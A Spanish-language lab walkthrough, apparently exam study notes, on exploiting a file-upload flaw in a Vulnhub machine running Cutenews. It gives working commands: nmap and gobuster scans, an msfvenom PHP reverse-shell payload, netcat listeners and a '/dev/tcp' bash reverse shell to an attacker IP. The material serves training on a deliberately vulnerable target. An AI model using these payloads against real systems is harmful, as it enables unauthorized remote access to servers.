
---
- TAG: #Explotación #Vulnerabilidades #Carga #Archivos 
---
# Creación de un Payload Malicioso en PHP y Explotación de Subida de Archivos

En este apartado vamos a estar viendo cómo crear un payload malicioso con extensión `.php` y cómo aprovechar la subida de archivos maliciosos dentro de una página web para poder obtener intrusión remota a la máquina, que es algo que cae en el examen.

Para esto vamos a necesitar:
1. Una máquina **Kali Linux**.
2. Máquina vulnerable de **Vulnhub** [Máquina SECTALKS: BNE0X03 - SIMPLE](https://www.vulnhub.com/entry/sectalks-bne0x03-simple%2C141/).

Realizamos la extracción y configuración de la máquina, que ya saben que por defecto debe estar en adaptador puente para que haya conexión entre máquinas.

Iniciamos la máquina **Simple**.

Una vez iniciada, vamos a nuestra máquina **Kali Linux** y realizamos el correcto procedimiento:
1. `arp-scan` para localizar la máquina víctima.
2. `ping` para ver el tipo de ttl y ver a qué nos enfrentamos.
3. `nmap` para encontrar vulnerabilidades y puertos abiertos:
   ```bash
   nmap -p- -sS -sC -sV --open --min-rate=5000 -n -Pn -vvv 1.2.3.4 -oN escaneo
   ```

Veremos que tenemos el puerto 80 abierto con el protocolo http, así que nos dirigimos al navegador para ver su contenido.

Nos encontramos con una página interesante de Login, con la opción de subir archivos. Este bloc es precisamente para hablar sobre ese tema, para saber cómo explotar este tipo de vulnerabilidades con archivos maliciosos.

Empezamos creando nuestro usuario y contraseña, en register.

Una vez dentro del panel con usuario y contraseña creado, siempre les recomiendo revisar información del nombre de la web. Por ejemplo, en este caso vemos el nombre de **Cutenews dashboard**. Este nombre lo podemos buscar con **Metasploit** para saber si existe una vulnerabilidad para este tipo de páginas web:
```msfconsole
msfconsole
msf6 > search Cutenews
```

Pero esta vez no va por ahí la intrusión, pero en el examen sí que es importante utilizarlo si encontramos un nombre o una marca.

Si en el examen encontramos una página web y vemos que nos da opciones de subir archivos, ya que esto nos permitirá un fácil acceso a la máquina.

Cuando nos encontremos en un escenario así, vamos a necesitar 2 cosas:
- Crear el archivo malicioso con `msfvenom`.
- Encontrar la ubicación donde se almacenen aquellos archivos que se suban desde el botón de subir.

Para encontrar la ubicación web donde se alojen estos archivos, lo podemos hacer con **Fuzzing**.

Explicado esto, empezamos creando nuestro payload malicioso con msfvenom:
```bash
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=443 -f raw > pwned.php
```

Una vez creado el payload malicioso, lo cargamos dentro de la página web.

Guardamos los cambios y vemos que se guardan efectivamente los cambios.

Ahora lo que necesitamos es averiguar dónde se guardó ese fichero, ya que nuestra intención es localizar el archivo para poderlo ejecutar y adquirir acceso a la máquina.

Es ahora donde entra en juego el **fuzzing web**.

Utilizamos la herramienta de gobuster para localizar directorios web. Para ello, recuerden utilizar el diccionario `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`:
```bash
gobuster dir -u http://1.2.3.4/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Aplicando esto, veremos que nos indica ciertos directorios interesantes como el de **uploads**.

Así que nos dirigimos al navegador y buscamos con el dominio encontrado a ver qué nos refleja. Efectivamente, nos muestra el archivo malicioso que habíamos creado asignado con nuestra dirección IP de atacante Kali Linux.

Ahora, para obtener acceso a la máquina, tenemos que ponernos a la escucha por el puerto 443 con **netcat**:
```bash
nc -nlvp 443
```

Ahora nos dirigimos al directorio `http://1.2.3.4/uploads/`.

Le damos clic al archivo que hemos cargado y listo, obtendremos acceso a la máquina.

Recuerden que el payload en msfvenom suele funcionar mal ya que, al pasar el tiempo, se suele perder la conexión.

Para solucionar eso, podemos hacer lo siguiente:

Haremos una reverse shell y, para ello, primero debemos ponernos a la escucha por otro puerto diferente:
```bash
nc -nlvp 4444
```

Y desde aquí recibimos la reverse shell.

Para ello, tenemos la ayuda de esta página web [devshells](https://www.devshells.com), que nos ayuda creando el payload `sh -i >& /dev/tcp/1.2.3.4/4444 0>&1` y lo pegamos en la conexión que tenemos con netcat por el puerto 433:
```bash
nc -nlvp 443
bash -c "sh -i >& /dev/tcp/1.2.3.4/4444 0>&1"
```

Y en otra terminal, abrimos el puerto **4444** que se encuentra abierto y veremos que recibimos la conexión.

Recuerden hacerlo fuera del examen ya que, dentro del examen, no hay internet.

Así es como podemos ganar acceso a una página web con la vulnerabilidad de subir archivos y acceder a ella desde otra ubicación.

Cuando podemos hacer eso, significa que podemos conseguir intrusión a la máquina víctima.

Esto es algo que sí o sí entra en el examen, así que practiquen mucho con este tema.

